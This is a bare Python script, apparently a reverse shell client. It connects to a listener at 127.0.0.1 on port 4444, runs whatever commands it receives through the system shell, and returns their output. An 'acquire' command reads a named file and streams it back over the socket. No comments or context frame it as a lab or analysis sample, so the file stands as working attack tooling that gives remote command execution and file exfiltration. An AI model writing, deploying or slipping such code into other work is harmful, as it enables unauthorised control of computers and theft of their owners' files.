#!/usr/bin/env python

import subprocess
import socket
import os

def Transfer(s,path):
    #
    if(os.path.exists(path)):
        #
        fileObject = open(path,'rb')
        #
        packet = fileObject.read(1024)
        #
        while(len(packet)>0):
            #
            s.send(packet)
            #
            packet = fileObject.read(1024)
            #
        s.send('DONE'.encode())
        #
    else:
        #
        s.send("[!] File not found ".encode())

def Connecting():
    #
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #
    s.connect(('127.0.0.1', 4444))
    #
    while(True):
        #
        command = s.recv(1024)
        #
        if('exit' in command.decode()):
            #
            s.close() 
            #
        elif('acquire' in command.decode()):
            #
            grab,path = command.decode().split("*")
            #
            try:
                #
                Transfer(s,path)
                #
            except:
                #
                pass
                #
        else:
            #
            cmd = subprocess.Popen(command.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            #
            s.send(cmd.stderr.read())
            #
            s.send(cmd.stdout.read())

def main():
    #
    Connecting()

if(__name__ == '__main__'):
    #
    main()